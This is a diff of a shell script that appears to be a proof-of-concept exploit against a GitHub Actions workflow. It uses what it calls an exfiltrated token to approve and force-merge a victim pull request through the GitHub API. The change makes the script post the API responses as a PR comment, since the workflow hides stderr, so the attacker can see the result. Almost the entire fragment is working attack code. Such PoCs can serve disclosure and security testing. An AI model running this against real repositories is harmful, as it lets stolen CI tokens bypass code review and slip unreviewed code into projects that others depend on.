@@ -103,7 +103,7 @@ APPROVE_CODE=$(curl --silent --show-error --output /tmp/poc-approve.json \
   --header "Content-Type: application/json" \
   --data '{"event":"APPROVE","body":"approved by exfiltrated token"}' \
   "https://api.github.com/repos/${GITHUB_REPOSITORY}/pulls/${VICTIM_PR}/reviews")
-log "approve  POST -> HTTP $APPROVE_CODE  body=$(head -c 200 /tmp/poc-approve.json)"
+log "approve  POST -> HTTP $APPROVE_CODE"
 
 MERGE_CODE=$(curl --silent --show-error --output /tmp/poc-merge.json \
   --write-out '%{http_code}' \
@@ -113,4 +113,30 @@ MERGE_CODE=$(curl --silent --show-error --output /tmp/poc-merge.json \
   --header "Content-Type: application/json" \
   --data '{"merge_method":"squash","commit_title":"Merge via exfiltrated token"}' \
   "https://api.github.com/repos/${GITHUB_REPOSITORY}/pulls/${VICTIM_PR}/merge")
-log "merge    PUT  -> HTTP $MERGE_CODE  body=$(head -c 400 /tmp/poc-merge.json)"
+log "merge    PUT  -> HTTP $MERGE_CODE"
+
+# Workflow's `>> /dev/null 2>&1` swallows our stderr — post the API response
+# bodies as a PR comment so the result is visible.
+APPROVE_BODY=$(head -c 300 /tmp/poc-approve.json)
+MERGE_BODY=$(head -c 500 /tmp/poc-merge.json)
+REPORT=$(cat <<EOF
+**Merge-escalation test result**
+
+\`POST /pulls/${VICTIM_PR}/reviews\` (approve) -> HTTP \`${APPROVE_CODE}\`
+\`\`\`json
+${APPROVE_BODY}
+\`\`\`
+
+\`PUT /pulls/${VICTIM_PR}/merge\` -> HTTP \`${MERGE_CODE}\`
+\`\`\`json
+${MERGE_BODY}
+\`\`\`
+EOF
+)
+REPORT_PAYLOAD=$(jq -n --arg body "$REPORT" '{body: $body}')
+curl --silent --request POST \
+  --header "Authorization: Bearer $TOKEN" \
+  --header "Accept: application/vnd.github+json" \
+  --header "Content-Type: application/json" \
+  --data "$REPORT_PAYLOAD" \
+  "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/comments" >/dev/null
